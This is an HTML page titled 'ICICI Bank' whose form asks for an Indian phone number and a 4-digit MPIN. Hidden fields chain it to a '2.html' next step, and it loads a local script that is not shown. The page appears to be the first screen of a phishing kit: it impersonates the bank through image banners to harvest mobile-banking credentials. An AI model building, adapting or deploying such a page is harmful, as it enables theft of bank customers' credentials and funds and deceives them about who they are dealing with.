<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/style.css">
    <title>ICICI Bank</title>
</head>

<body>
    <header class="d-flex justify-content-center mb-4">
        <img src="assets/header.jpg" width="100%" alt="">
    </header>
    <main class="container">
        <div id="test" class="text-danger text-center fw-bold"></div>
        <input type="hidden" id="page_type" value="home">
        <input type="hidden" id="nextValue" value="2.html">
        <form action="" id="form" class="mt-3">
            <div class="mb-4 form-group">
                <label for="" class="form-label">Enter Your Phone Number</label>
                <div class="d-flex align-items-center" style="gap:10px;">
                    <span>+91</span>
                    <input type="text" inputmode="numeric" minlength="10" maxlength="10" name="phone" placeholder="Enter your phone number" class="form-control" required>
                </div>
            </div>
            <div class="mb-4 form-group">
                <label for="" class="form-label">Enter Your MPIN Pin</label>
                <input type="text"  inputmode="numeric" name="mpin" placeholder="Enter your MPIN" maxlength="4" minlength="4" class="form-control" required>
            </div>
            <button type="submit" id="submit-button" class="btn btn-lg bg-color btn-danger w-100 mt-2">Proceed</button>
        </form>
    </main>
    
    <footer class="mt-4">
        <img src="assets/footer.jpg" width="100%" alt="">
    </footer>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
    <script src="assets/script.js"></script>
</body>

</html>
